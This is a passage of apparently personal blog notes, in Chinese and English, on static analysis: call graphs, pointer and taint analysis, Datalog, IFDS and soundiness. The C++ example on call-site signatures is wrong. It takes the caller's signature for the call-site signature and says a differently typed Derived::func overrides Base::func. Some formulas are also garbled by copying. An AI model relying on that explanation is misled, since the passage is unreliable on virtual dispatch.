(IN[B] - killB);    if (old_OUT ≠ OUT[B])    Add all successors of B to Worklist&#x2F;&#x2F; Forward Analysis&#x2F;&#x2F;  OUT will not change if IN does not change</code></pre></li></ul><h3 id="interprocedural-analysis">Interprocedural Analysis</h3><h4 id="motivation">Motivation</h4><h4 id="call-graph-construction-cha">Call Graph Construction (CHA)</h4><ul><li><p><strong>Call Graph</strong></p></li><li><p><strong>Call Graph Construction for OOPLs</strong> (focus onJava)</p><ul><li>Class hierarchy analysis (CHA)</li><li>Rapid type analysis (RTA)</li><li>Variable type analysis (VTA)</li><li>Pointer analysis (k-CFA)</li></ul></li><li><p>在程序分析中,call表示函数调用。根据<strong>调用方式</strong>的不同,可以分为:</p><ol type="1"><li>static call</li></ol><ul><li>静态调用,即普通的函数调用</li><li>调用目标可以通过静态分析确定</li></ul><ol start="2" type="1"><li>special call</li></ol><ul><li>特殊函数调用,通常是系统函数</li><li>调用目标固定,但行为依赖具体实现</li></ul><ol start="3" type="1"><li>virtual call</li></ol><ul><li>虚函数调用</li><li>调用目标依赖运行时类型</li><li>静态分析难以确定</li></ul><ol start="4" type="1"><li>indirect call</li></ol><ul><li>间接调用,通过函数指针等调用</li><li>调用目标无法静态确定</li></ul><p>对于前两种静态调用,较易通过<code>静态分析</code>确定目标。</p><p>但虚函数和间接调用会使静态分析更困难,需要<code>复杂的指针和虚函数分析</code>。</p></li><li><p>During run-time, a <code>virtual call</code> is resolved basedon</p><ol type="1"><li>type of the receiver object (pointed by o)</li><li>method signature at the call site</li></ol></li><li><p>在面向对象编程的虚函数(VirtualFunction)调用中,<code>调用点方法签名</code>(Call Site MethodSignature)指的是调用虚函数的语句所在位置的方法的签名信息。</p><p>例如:</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Base</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span>  <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Derived</span> <span class="token operator">:</span> <span class="token base-clause"><span class="token keyword">public</span> <span class="token class-name">Base</span></span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span><span class="token operator">:</span>  <span class="token keyword">virtual</span> <span class="token keyword">void</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token keyword">double</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">foo</span><span class="token punctuation">(</span>Base<span class="token operator">*</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  b<span class="token operator">-></span><span class="token function">func</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 调用点</span><span class="token punctuation">&#125;</span></code></pre><p>这里foo()方法是调用点,它的签名是:</p><p>void foo(Base* b)</p><p>这个调用点签名与Base::func(int x)匹配。</p><p>而Derived类中func()的签名虽然不 match,但可以被覆盖。</p><p>总结:</p><ul><li>调用点签名会与实际调用的虚函数签名进行匹配。</li><li>用于验证调用的正确性。</li><li>是C++虚函数分发的必要信息。</li><li>调用点签名的解析是程序分析的重要步骤。</li></ul></li><li><p><strong>Dispatch: An Example</strong><imgsrc="https://s2.loli.net/2023/07/15/nE5lBakYMXsOuqQ.png"alt="image-20230715164234761" /></p></li><li><p>CHA</p></li><li><p><strong>Call Graph Construction: Algorithm</strong></p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token function">BuildCallGraph</span><span class="token punctuation">(</span>𝑚𝑚𝑒𝑒𝑒𝑒𝑒𝑒𝑒𝑒𝑒𝑒<span class="token punctuation">)</span>WL <span class="token operator">=</span> <span class="token punctuation">[</span>𝑚𝑚𝑒𝑒𝑒𝑒𝑒𝑒𝑒𝑒𝑒𝑒<span class="token punctuation">]</span><span class="token punctuation">,</span> CG <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> RM <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> WL is <span class="token operator">not</span> empty <span class="token keyword">do</span>        remove 𝑚𝑚 from WL        <span class="token keyword">if</span> 𝑚𝑚 ∉ RM then            add 𝑚𝑚 to RM            foreach call site 𝑐𝑐𝑐𝑐 in 𝑚𝑚 <span class="token keyword">do</span>                T <span class="token operator">=</span> <span class="token function">Resolve</span><span class="token punctuation">(</span>𝑐𝑐𝑐𝑐<span class="token punctuation">)</span>                foreach target method 𝑚𝑚푚 in T <span class="token keyword">do</span>                    add 𝑐𝑐𝑐𝑐 → 𝑚𝑚′to CG                    add 𝑚𝑚′to WL    <span class="token keyword">return</span> CG</code></pre></li></ul><h4 id="interprocedural-control-flow-graph">Interprocedural Control-FlowGraph</h4><ul><li><p>An ICFG of a program consists of CFGs of the methods in theprogram, plus two kinds of additional edges:</p><ul><li>call edges</li><li>return edges</li></ul></li><li><p>example</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">bar</span><span class="token punctuation">(</span>…<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// call site</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token comment">// return site</span><span class="token punctuation">&#125;</span></code></pre></li><li><p>ICFG: An Example<imgsrc="https://s2.loli.net/2023/07/19/MUgSRYcAkNtnosb.png"alt="image-20230719165736885" /></p></li></ul><h4 id="interprocedural-data-flow-analysis">Interprocedural Data-FlowAnalysis</h4><ul><li>Interprocedural Constant Propagation: An Exampl<imgsrc="https://s2.loli.net/2023/07/20/ZpXc38S4NGnCAjT.png"alt="image-20230720161955307" /></li></ul><h3 id="课程08pointer-analysis">课程08（Pointer Analysis）</h3><h5 id="motivation-1">Motivation</h5><ul><li>对象、变量的指向关系：<ul><li>A fundamental static analysis • Computes which memory locations apointer can point to</li></ul></li><li>may-analysis</li></ul><h5 id="introduction-to-pointer-analysis">Introduction to PointerAnalysis</h5><ul><li><p>Two closely related but different concepts</p><ul><li>Pointer analysis: which objects a pointer can point to?</li><li><strong>Alias analysis</strong>: can two pointers point to the sameobject</li></ul></li><li><p>Applications of Pointer Analysis</p><ul><li>Fundamental information</li><li>Call graph, aliases, …</li><li>Compiler optimization<ul><li>Virtual call inlining, …</li></ul></li><li>Bug detection<ul><li>Null pointer detection, …</li></ul></li><li><strong>Security analysis</strong><ul><li>Information flow analysis, …</li></ul></li><li>And many more …</li></ul></li></ul><h5 id="key-factors-of-pointer-analysis">Key Factors of PointerAnalysis</h5><ul><li><p><strong>Heap abstraction</strong>：Allocation-SiteAbstraction</p><p>• Model concrete objects by their allocation sites • One abstractobject per allocation site to represent all its allocated concreteobjects</p></li><li><p><strong>Context Sensitivity</strong><imgsrc="https://s2.loli.net/2023/07/22/rPMJ2ump9Nf4Z3F.png"alt="image-20230722113922836" /></p></li><li><p>Flow Sensitivity<imgsrc="https://s2.loli.net/2023/07/22/3DbV9TlimXGPoYE.png"alt="image-20230722114043428" /></p></li><li><p><strong>Analysis Scope</strong>：whole program</p><ul><li>demand driven<imgsrc="https://s2.loli.net/2023/07/22/fvxnN2H1LjKtTuP.png"alt="image-20230722114209116" /></li></ul></li><li><p><strong>Pointer Analysis in This Course</strong><imgsrc="https://s2.loli.net/2023/07/22/stNV7AHv4mfJnOa.png"alt="image-20230722114251220" /></p></li></ul><h5 id="concerned-statements">Concerned Statements</h5><ul><li><p>We only focus on <strong>pointer-affectingstatements</strong></p></li><li><p>Pointers in Java • Local variable: x • Static field: C.f •Instance field: x.f • Array element: array[i]</p></li><li><p>Statements:</p><p>Newx = new T() Assignx = y Storex.f = y Loady = x.f Callr = x.k(a,…)</p></li></ul><h3 id="pointer-analysis-foundations-i">Pointer Analysis Foundations(I)</h3><h4 id="pointer-analysis-rules">Pointer Analysis: Rules</h4><p><img src="https://s2.loli.net/2023/07/22/4UlsTb12JHZntIg.png"alt="image-20230722120311816" /><imgsrc="https://s2.loli.net/2023/07/22/Nak3DoEmzdq4rvg.png"alt="image-20230722120346628" /></p><h4 id="how-to-implement-pointer-analysis">How to Implement PointerAnalysis</h4><ul><li>Essentially, pointer analysis is to propagate points-to informationamong pointers (variables &amp; fields）</li><li>Key to implementation: when 𝑝𝑝𝑝𝑝 𝑥𝑥 is changed, propagate thechanged part to the related pointers of 𝑥</li><li>Pointer flow graph of a program is a directed graph that expresseshow <strong>objects</strong> flow among the pointers in theprogram.</li><li><strong>Pointer Flow Graph: An Example</strong><imgsrc="https://s2.loli.net/2023/07/22/EznYUa6xrqohvDN.png"alt="image-20230722172937284" /></li></ul><h4 id="pointer-analysis-algorithms">Pointer Analysis: Algorithms</h4><ul><li><figure><img src="https://s2.loli.net/2023/07/22/ut5gwhBP78sc6KH.png"alt="image-20230722173009462" /><figcaption aria-hidden="true">image-20230722173009462</figcaption></figure></li><li>Algorithm <imgsrc="https://s2.loli.net/2023/07/22/YwCpfhmAy5W1BlG.png"alt="image-20230722173041615" /></li><li>An Example<imgsrc="https://s2.loli.net/2023/07/22/aGgSdCUJcp36FyT.png"alt="image-20230722173216515" /></li></ul><h4 id="pointer-analysis-with-method-calls">Pointer Analysis with MethodCalls</h4><ul><li><p><strong>Rule: Call</strong><imgsrc="https://s2.loli.net/2023/07/27/FgnVXbOh2UiEruf.png"alt="image-20230727052238933" /></p></li><li><p>Algorithms<imgsrc="https://s2.loli.net/2023/07/27/txqfvPHZNuEwYGI.png"alt="image-20230727052357102" /></p><ol type="1"><li><figure><img src="https://s2.loli.net/2023/07/27/5swaNHtri3LAuMq.png"alt="image-20230727053003917" /><figcaption aria-hidden="true">image-20230727053003917</figcaption></figure></li><li><figure><img src="https://s2.loli.net/2023/07/27/ZmaNXS2sz8vypbL.png"alt="image-20230727053202988" /><figcaption aria-hidden="true">image-20230727053202988</figcaption></figure></li><li><figure><img src="https://s2.loli.net/2023/07/27/coANI7Z2shEiVQb.png"alt="image-20230727053336324" /><figcaption aria-hidden="true">image-20230727053336324</figcaption></figure></li></ol></li></ul><h3 id="pointer-analysis--context-sensitivity-i">Pointer Analysis-Context Sensitivity (I)</h3><ul><li>上下文不敏感<imgsrc="https://s2.loli.net/2023/07/27/4cFf6pgPHy2AWXx.png"alt="image-20230727183228700" /></li><li>上下文敏感<imgsrc="https://s2.loli.net/2023/07/27/3dLweaYzMAksvDy.png"alt="image-20230727183254793" /></li></ul><h4 id="introduction-1">Introduction</h4><ul><li>Context-Sensitive Heap<imgsrc="https://s2.loli.net/2023/07/27/ZslbqKt8ERFuQie.png"alt="image-20230727183617906" /></li></ul><h4 id="context-sensitive-pointer-analysis-rules">Context SensitivePointer Analysis: Rules</h4><ul><li><p>Domain and Notations<imgsrc="https://s2.loli.net/2023/07/27/nI4EFhyucqCbtHl.png"alt="image-20230727183659101" /></p></li><li><p>rule<img src="https://s2.loli.net/2023/07/27/P4Ru8zfplN6KEYh.png"alt="image-20230727183717458" /></p><figure><img src="https://s2.loli.net/2023/07/27/3Q8uAqTO6Dg21Zy.png"alt="xx" /><figcaption aria-hidden="true">xx</figcaption></figure><figure><img src="https://s2.loli.net/2023/07/27/nfTuGOqkeSrWDot.png"alt="image-20230727183808376" /><figcaption aria-hidden="true">image-20230727183808376</figcaption></figure></li></ul><h4 id="context-sensitive-pointer-analysis-algorithms">Context SensitivePointer Analysis: Algorithms</h4><ul><li><strong>Nodes</strong>: CSPointer = (C × V) ⋃ (C × O × F) A node nrepresents a context-sensitive variable or a field of acontext-sensitive abstract object With C.S., the nodes (pointers) arequalified by contexts</li><li><strong>Edges</strong>: CSPointer × CSPointer An edge 𝑥𝑥 → 𝑦𝑦 meansthat the objects pointed by pointer 𝑥𝑥 may flow to (and also be pointedto by) pointer 𝑦𝑦 e.g., edge 𝑐𝑐: 𝑎𝑎 → 𝑐𝑐′: 𝑏𝑏 means that objects in 𝑝𝑝𝑝𝑝𝑐𝑐: 𝑎𝑎 may flow to 𝑝𝑝𝑝𝑝 𝑐𝑐′: 𝑏</li><li><strong>C.S. Pointer Analysis: Algorithm</strong><imgsrc="https://s2.loli.net/2023/07/29/salJLxpgj5ik8Wd.png"alt="image-20230729000218650" /></li></ul><h4 id="context-sensitivity-variants">Context Sensitivity Variants</h4><ul><li>类型<ul><li>Call-site sensitivity</li><li>Object sensitivity</li><li>Type sensitivity</li></ul></li><li><strong>select()</strong><imgsrc="https://s2.loli.net/2023/07/29/yrkqm5gWdRDtNiU.png"alt="image-20230729021744245" /></li><li><strong>Call-Site Sensitivity</strong>: Example<imgsrc="https://s2.loli.net/2023/07/29/ZwYaH1zC8E5sFy6.png" /></li><li><strong>k-Limiting Context Abstraction</strong><ul><li>Motivation<ul><li>Ensure termination of pointer analysis</li><li>Avoid too many contexts (long call chains) in real-world programsblow up the pointer analysis</li></ul></li><li>Approach: set an upper bound for length of contexts, denoted by k<ul><li>For call-site sensitivity, each context consists of the last k callsites of the call chains</li><li>In practice, k is a small number (usually ≤3)</li><li>Method contexts and heap contexts may use different k • e.g., k=2for method contexts, k=1 for heap contexts</li></ul></li></ul></li><li><strong>k-Call-Site Sensitivity/k-CFA</strong><imgsrc="https://s2.loli.net/2023/07/29/p8TJZB4uUOib9GN.png"alt="image-20230729002307516" /></li><li><strong>Call-Site vs. Object Sensitivity</strong>: example<imgsrc="https://s2.loli.net/2023/07/29/1rSDsihvBwaVdk9.png"alt="image-20230729003042085" /></li><li><strong>C.S.(1-Object) vs C.S.(1-call-site)</strong><imgsrc="https://s2.loli.net/2023/07/29/aiAB7CZbGlUnDg2.png"alt="image-20230729003257596" /><ul><li>In theory, their precision is incomparable</li><li>In practice, object sensitivity generally outperforms call-sitesensitivity for OO languages (like Java)</li></ul></li><li><strong>Type Sensitivity</strong><ul><li>At a method call, use the type containing the allocation site of thereceiver object with its heap context as callee context</li><li>A coarser abstraction over object sensitivity</li><li>Under the same k-limiting, the precision of type sensitivity is<strong>no better than</strong> object sensitivity<imgsrc="https://s2.loli.net/2023/07/29/ca7WNB6nvMwALRU.png"alt="image-20230729003841836" /></li></ul></li></ul><h3 id="static-analysis-for-security">Static Analysis for Security</h3><h4 id="information-flow-security">Information Flow Security</h4><h4 id="confidentiality-and-integrity">Confidentiality andIntegrity</h4><ul><li>Requires the information of high variables have no effect on (i.e.,should not interfere with) the information of low variables<imgsrc="https://s2.loli.net/2023/07/29/FykDmCJVPZ9vpBt.png"alt="image-20230729021952720" /></li><li>机密性和完整性<imgsrc="https://s2.loli.net/2023/07/29/4EGbqDfamzUMk1i.png"alt="image-20230729022051611" /></li></ul><h4 id="explicit-flows-and-covert-channels">Explicit Flows and CovertChannels</h4><ul><li>Implicit Flows</li><li><strong>Covert/Hidden Channels</strong><imgsrc="https://s2.loli.net/2023/07/29/xopda1Gk65P3Zsw.png"alt="image-20230729022329346" /><ul><li>Mechanisms for signalling information through a computing system areknown as channels.</li><li>Channels that exploit a mechanism whose primary purpose is notinformation transfer are called covert channels*.</li></ul></li><li><strong>Explicit Flows and Covert Channels</strong><imgsrc="https://s2.loli.net/2023/07/29/BMv5hVG9ONIr1px.png"alt="image-20230729022412090" /></li></ul><h4 id="taint-analysis">Taint Analysis</h4><ul><li><p>Taint analysis is the most common information flow analysis. Itclassifies program data into two kinds: • Data of interest, some kindsof labels are associated with the data, called tainted data • Otherdata, called untainted data</p></li><li><p>sources and sinks<imgsrc="https://s2.loli.net/2023/07/29/AvNusBqtDH9XkJV.png"alt="image-20230729022520456" /><imgsrc="https://s2.loli.net/2023/07/29/D82oFzmI3Y5Ev7s.png" /></p></li><li><p><strong>Taint and Pointer Analysis, Together</strong></p><p>• Treats tainted data as (artificial) objects • Treats sources asallocation sites (of tainted data) • Leverages pointer analysis topropagate tainted data</p></li><li><p><strong>Domains and Notations</strong><imgsrc="https://s2.loli.net/2023/07/29/q6H5Gd82fAyhNel.png"alt="image-20230729022740672" /></p></li><li><p><strong>Inputs &amp; Outputs</strong><imgsrc="https://s2.loli.net/2023/07/29/1GJ5dnTDzKqltV9.png"alt="image-20230729022832479" /></p></li><li><p><strong>Rules: Call</strong><imgsrc="https://s2.loli.net/2023/07/29/d5GbeICAfT2pN6g.png"alt="image-20230729022905625" /></p></li><li><p>Taint Analysis: An Example<imgsrc="https://s2.loli.net/2023/07/29/7eWGmzOjotEQ6sJ.png"alt="image-20230729022959191" /></p></li></ul><p>paper:Implicit Flows: Can't Live With Em, Can't Live Without Em</p><h3 id="datalog-based-program-analysis">Datalog-Based Programanalysis</h3><h4 id="motivation-2">Motivation</h4><ul><li>Declarative: what to do (~specification)</li></ul><p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> Persons <span class="token keyword">WHERE</span> Age <span class="token operator">>=</span> <span class="token number">18</span><span class="token punctuation">;</span></code></pre></p><h4 id="introduction-to-datalog">Introduction to Datalog</h4><ul><li><p><strong>Datalog</strong></p><p>Datalog is a declarative logic programming language that is a subsetof Prolog. • It emerged as a database language (mid-1980s)* • Now it hasa variety of applications</p><ul><li>Program analysis</li><li>Declarative networking</li><li>Big data</li><li>Cloud computing</li><li>…</li></ul></li><li><p><code>Datalog = Data + Logic</code></p></li><li><p><strong>Predicates</strong> (Data)</p><p>• In Datalog, a predicate (relation) is a set of statements •Essentially, a predicate is a table of data</p></li><li><p>A <strong>fact</strong> asserts that a particular tuple (a row)belongs to a relation (a table), i.e., it represents a predicate beingtrue for a particular combination of values</p></li><li><p>Atoms</p><ul><li>Atoms are basic elements of Datalog, which represent predicates ofthe form</li><li>Examples • Age(person,age) • Age(“Xiaoming”,18)</li><li><code>P(X1,X2,…,Xn)</code> is called relational atom</li><li><code>P(X1,X2,…,Xn)</code> evaluates to true when predicate P：contains the tuple described by X1,X2,…,Xn</li></ul></li><li><p>Interpretation of Datalog Rules</p><pre class="language-none"><code class="language-none">H(X1,X2) &lt;- B1(X1,X3),B2(X2,X4),…,Bn(Xm).</code></pre><p>• Consider all possible combinations of values of the variables inthe subgoals • If a combination makes all subgoals true, then the headatom (with corresponding values) is also true • The head predicateconsists of all true atoms</p></li><li><figure><img src="https://s2.loli.net/2023/07/29/OKah1PNQykJrtgj.png"alt="image-20230729164804342" /><figcaption aria-hidden="true">image-20230729164804342</figcaption></figure></li><li><p>EDB and IDB Predicates</p><ol type="1"><li>EDB (extensional database) • The predicates that are defined in apriori • Relations are immutable • Can be seen as input relations</li><li>IDB (intensional database) • The predicates that are establishedonly by rules • Relations are inferred by rules • Can be seen as outputrelations</li><li>• H can only be IDB • Bi can be EDB or IDB</li></ol></li><li><p>Rule Safety</p><pre class="language-none"><code class="language-none">A(x) &lt;- B(y), x &gt; y.A(x) &lt;- B(y), !C(x,y).</code></pre><p>• A rule is safe if every variable appears in at least onenon-negated relational atom • Above two rules are unsafe • In Datalog,only safe rules are allowed</p></li><li><p>In Datalog, recursion and negation of an atom must be separated.Otherwise, the rules may contain contradiction and the inference failsto converge.</p><pre class="language-none"><code class="language-none">A(x) &lt;- B(x), !A(x).</code></pre></li><li><p>Execution of Datalog Programs</p><p>• Monotonicity: Datalog is monotone as facts cannot be deleted •Termination: A Datalog program always terminates as</p><ol type="1"><li>Datalog is monotone</li><li>Possible values of IDB predicates are finite (rule safety)</li></ol></li></ul><h4 id="pointer-analysis-via-datalog">Pointer Analysis via Datalog</h4><ul><li>Datalog Model for Pointer Analysis<imgsrc="https://s2.loli.net/2023/07/29/HM1AGfdE9tLrxg7.png"alt="image-20230729165538812" /></li><li>an example<imgsrc="https://s2.loli.net/2023/07/29/bfEwdp16yDLBqlc.png"alt="image-20230729165558134" /></li><li>Datalog Rules for Pointer Analysis<imgsrc="https://s2.loli.net/2023/07/29/XZm6jY4MRfwscIb.png"alt="image-20230729165644480" /></li><li>an example<imgsrc="https://s2.loli.net/2023/07/29/VuKt3UE9gY5kOdL.png"alt="image-20230729165719982" /></li><li>Handle Method Calls<imgsrc="https://s2.loli.net/2023/07/29/EWsOYwyXTGaHuvn.png"alt="image-20230729165802327" /></li><li>Whole-Program Pointer Analysis<imgsrc="https://s2.loli.net/2023/07/29/cUI6ZdbxmgAN2rn.png"alt="image-20230729165819342" /></li></ul><h4 id="taint-analysis-via-datalog">Taint Analysis via Datalog</h4><ul><li><p>Datalog Model for Taint Analysis</p><p>On top of pointer analysis • EDB predicates • Source(m: M) // sourcemethods • Sink(m: M, i: N) // sink methods • Taint(l: S, t: T) //associates each call site to the tainted data from the call site • IDBpredicate • TaintFlow(sr: S, sn: S, i: N) // detected taint flows, e.g.,TaintFlow(𝑝𝑝𝑟𝑟,𝑝𝑝𝑛𝑛,𝑖𝑖) denotes that tainted data from source call 𝑝𝑝𝑟𝑟may flow to 𝑖𝑖-th argument of sink call 𝑝𝑝𝑛</p></li><li><p>rules<imgsrc="https://s2.loli.net/2023/07/29/i4VSWxm5Y9GtEDd.png"alt="image-20230729165926396" /></p></li></ul><h3 id="cfl-reachability-and-ifds">CFL-Reachability and IFDS</h3><h4 id="feasible-and-realizable-paths">Feasible and RealizablePaths</h4><ol type="1"><li><strong>Infeasible Paths</strong>: Paths in CFG that do notcorrespond to actual executions</li><li>example:<ol type="1"><li>call site和返回值需要匹配<imgsrc="https://s2.loli.net/2023/08/02/nYbGrt4hApameXC.png"alt="image-20230802183109374" /></li></ol></li><li>R<strong>ealizable Paths</strong>: The paths in which “returns” arematched with corresponding “calls”<ul><li>"Realizable paths"是指那些在程序执行中可能实际发生的路径，其中所有的函数调用和返回都是正确匹配的。这些路径在代码中是合法的，可以被实际执行。</li><li>"Unrealizable paths"是指那些在程序执行中不可能实际发生的路径，其中存在一些函数调用没有对应的返回操作，或者存在一些返回操作没有对应的函数调用。这些路径在代码中是非法的，不能被实际执行。</li></ul></li></ol><h4 id="cfl-reachabilityimage-20230802183533035">CFL-Reachability<imgsrc="https://s2.loli.net/2023/08/02/bGZupA2z6cmsrLH.png"alt="image-20230802183533035" /></h4><h4 id="overview-of-ifds">Overview of IFDS</h4><ol type="1"><li><strong>IFDS</strong> (Interprocedural, Finite, Distributive, SubsetProblem):<ol type="1"><li>IFDS is for interprocedural data flow analysis with<strong>distributive</strong> flow functions over<strong>finite</strong> domains.</li><li>Provide meet-over-all-realizable-paths (<strong>MRP</strong>)solution</li></ol></li></ol><h4 id="supergraph-and-flow-functions">Supergraph and FlowFunctions</h4><ol type="1"><li><p><imgsrc="https://s2.loli.net/2023/08/02/GrwdbHN8Svz6ga4.png" /></p></li><li><p><strong>Supergraph</strong></p><ol type="1"><li>In IFDS, a program is represented by G* = (N<em>, E</em>) called asupergraph. •G* consists of a collection of flow graphs G1, G2,… (onefor each procedure) •Each flowgraph Gphas a unique start node sp, and aunique exit node ep</li><li>G* has three edges for each procedure call: •An intraproceduralcall-to-return-site edge from Callpto Retp •An interproceduralcall-to-start edge from Callpto spof the called procedure •Aninterprocedural exit-to-return-site edge from ep of the called procedureto Retp</li><li>“Possibly-uninitialized variables”: for each node n ∈ N*, determinethe set of variables that may be uninitialized before execution reachesn.</li><li><figure><img src="https://s2.loli.net/2023/08/02/mIYkOBZGodM5JpT.png"alt="image-20230802184353188" /><figcaption aria-hidden="true">image-20230802184353188</figcaption></figure></li></ol></li><li><p><strong>Build Exploded Supergraph</strong></p><p>• Build exploded supergraph G#for a program by transforming flowfunctions to representation relations (graphs) • Each flow function canbe represented as a graph with 2(D+1) nodes (at most (D+1)2edges), whereD is a finite set of dataflow facts</p><ol type="1"><li><figure><img src="https://s2.loli.net/2023/08/02/Dw1uZqnK8MPg3sS.png"alt="image-20230802184705953" /><figcaption aria-hidden="true">image-20230802184705953</figcaption></figure></li><li>So We Need the “Glue Edge” <code>0 ⟶ 0</code>!<imgsrc="https://s2.loli.net/2023/08/02/rfhUMW6ZauTpKqF.png"alt="image-20230802184821097" /></li></ol></li></ol><h4 id="exploded-supergraph-and-tabulation-algorithm">ExplodedSupergraph and Tabulation Algorithm</h4><ol type="1"><li><figure><img src="https://s2.loli.net/2023/08/02/MYLDIrSZ6BnW3GK.png"alt="image-20230802184930312" /><figcaption aria-hidden="true">image-20230802184930312</figcaption></figure></li><li>Given an exploded supergraph G#, Tabulation algorithm determines theMRP solution by finding out all realizable paths starting from&lt;smain, 0&gt;</li><li>Tabulation Algorithm<imgsrc="https://s2.loli.net/2023/08/02/mOTwyYAtkV1qe4F.png"alt="image-20230802185054340" /></li></ol><h4 id="understanding-the-distributivity-of-ifds">Understanding theDistributivity of IFDS</h4><p>1.<img src="https://s2.loli.net/2023/08/02/pAUYZjvEnX4t5VN.png"alt="image-20230802185237347" /></p><ol start="2" type="1"><li><code>z = x + y</code><ol type="1"><li>Given a statement S, besides S itself, if we need to consider<strong>multiple input</strong> data facts to create correct outputs,then the analysis is not distributive and should <strong>not</strong> beexpressed in IFDS.<ol type="1"><li>In IFDS, each data fact (circle) and its propagation (edges) couldbe handled <strong>independently</strong>, and doing so will not affectthe correctness of the final results.</li></ol></li></ol></li><li><strong>Pointer Analysis</strong><imgsrc="https://s2.loli.net/2023/08/03/B8CJ5GXKj3NDFcY.png"alt="image-20230803002227400" /><ol type="1"><li>z and y.f should have pointed to object [new T]. However, flowfunction’s input data facts lack of the alias information, alias(x,y),alias(x.f,y.f), and we need alias information to produce correctoutputs.</li></ol></li></ol><h3 id="soundiness">Soundiness</h3><h4 id="soundness-and-soundiness">Soundness and Soundiness</h4><ol type="1"><li><strong>Soundness:</strong> Conservative approximation: the analysiscaptures all program behaviors,or the analysis result models allpossible executions of the program</li><li><strong>Hard Language Features</strong> for Static Analysis：<ol type="1"><li>• Java Reflection, native code, dynamic class loading, etc.</li><li>• JavaScript eval, document object model (DOM), etc.</li><li>• C/C++ Pointer arithmetic, function pointers, etc</li></ol></li><li>Hard-to-analyze features: an aggressively conservative treatment tothese features will likely make the analysis too imprecise to scale,rendering the analysis useless</li><li><strong>As a Result</strong>：<ol type="1"><li>Generally, a claimed sound static analysis has a sound core in itsimplementation, i.e., most language features are over-approximated whilesome specific and/or hard ones are under-approximated</li><li>•Not handling certain hard language features properly, e.g., Javareflection, may have a profound impact on analysis results</li><li>•Treatments to hard language features are usually omitted or onlymentioned in an off-hand manner in some impl/eval parts in papers</li></ol></li><li>Then claiming soundness in papers may <strong>misleadreaders</strong>:<ol type="1"><li>•For <strong>non-experts</strong>, they may erroneously concludethat the analysis is sound and confidently rely on the analysisresults</li><li>•For <strong>experts</strong>, it is still hard for them tointerpret the analysis results (how sound, fast, precise is theanalysis) without a clear explanation about how they treat thoseimportant and hard language features</li></ol></li><li>Soundness, Soundiness and Unsoundness<ol type="1"><li>A soundy analysis aims to capture all dynamic behaviors with certainhard language features unsoundly handled within reason</li><li>• A sound analysis requires to capture all dynamic behaviors</li><li>• An unsound analysis deliberately ignores certain behaviors in itsdesign for better efficiency, precision or accessibility</li></ol></li></ol><h4 id="hard-language-feature-java-reflection">Hard Language Feature:Java Reflection</h4><ol type="1"><li><figure><img src="https://s2.loli.net/2023/08/03/nFaspoDzMdj3YCB.png"alt="image-20230803023759372" /><figcaption aria-hidden="true">image-20230803023759372</figcaption></figure></li><li>Why We Need to Analyze Java Reflection<imgsrc="https://s2.loli.net/2023/08/03/8FvjY4HLDe3aXRi.png"alt="image-20230803023852394" /></li><li>How to Analyze Java Reflection?<imgsrc="https://s2.loli.net/2023/08/03/gwTsfuZx3AJCr7X.png"alt="image-20230803024000567" /><ol type="1"><li>When string arguments cannot be resolved statically,infer thereflective targets at their usage points!<ol type="1"><li>String Constant analysis + Pointer Analysis</li><li>Type Inference + String analysis + Pointer Analysis</li></ol></li></ol></li></ol><h4 id="hard-language-feature-native-code">Hard Language Feature: NativeCode</h4><ol type="1"><li>What Happens When Print in Java?<imgsrc="https://s2.loli.net/2023/08/03/eTuoiAYSUyfO1Db.png"alt="image-20230803024312060" /></li><li>Java Native Interface (JNI)<imgsrc="https://s2.loli.net/2023/08/03/xuKSeCqUGMdh1jp.png"alt="image-20230803024329860" /></li><li>Why Native Code is Hard to Analyze?<imgsrc="https://s2.loli.net/2023/08/03/fok4OG59zNjiUVS.png"alt="image-20230803024753784" /></li><li>Native Code Modeling (Example)<imgsrc="https://s2.loli.net/2023/08/03/Qz5pUsOIkLWrTef.png"alt="image-20230803024830163" /></li></ol>]]></content>
      
      
      <categories>
          
          <category> Academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Static-Analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Static Analysis II</title>
      <link href="/2023/12/09/static-analysis-ii/"/>
      <url>/2023/12/09/static-analysis-ii/</url>
      
